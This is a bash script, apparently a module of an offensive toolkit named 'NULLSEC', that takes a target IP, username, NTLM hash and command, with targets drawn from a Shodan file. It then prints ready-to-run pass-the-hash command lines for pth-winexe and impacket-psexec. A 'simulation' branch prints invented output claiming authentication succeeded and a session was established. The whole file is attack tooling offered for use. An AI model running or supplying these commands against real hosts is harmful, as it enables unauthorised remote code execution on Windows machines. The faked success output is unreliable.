#!/bin/bash
# NULLSEC Pass-the-Hash - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC PASS-THE-HASH ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Target IP: '${RESET})" TARGET; [ -z "$TARGET" ] && TARGET="192.168.1.100"
read -p "$(echo -e ${WHITE}'  [>] Username: '${RESET})" USER; [ -z "$USER" ] && USER="Administrator"
read -p "$(echo -e ${WHITE}'  [>] NTLM hash: '${RESET})" HASH; [ -z "$HASH" ] && HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
read -p "$(echo -e ${WHITE}'  [>] Command to execute: '${RESET})" CMD; [ -z "$CMD" ] && CMD="whoami"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing pass-the-hash attack"
    echo -e "${DIM}[*] Target: $TARGET${RESET}"
    echo -e "${DIM}[*] User: $USER${RESET}"; sleep 0.4
    echo -e "${DIM}[*] Authenticating with NTLM hash...${RESET}"; sleep 0.6
    echo -e "${GREEN}[+]${RESET} Authentication successful"
    echo -e "${DIM}[*] Executing: $CMD${RESET}"; sleep 0.3
    echo -e "${GREEN}[+]${RESET} Output: $TARGET\\$USER"
    echo -e "${GREEN}[+]${RESET} Session established"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} pth-winexe -U $USER%$HASH //$TARGET '$CMD'"
    echo -e "${DIM}Also: impacket-psexec -hashes $HASH $USER@$TARGET${RESET}"
fi
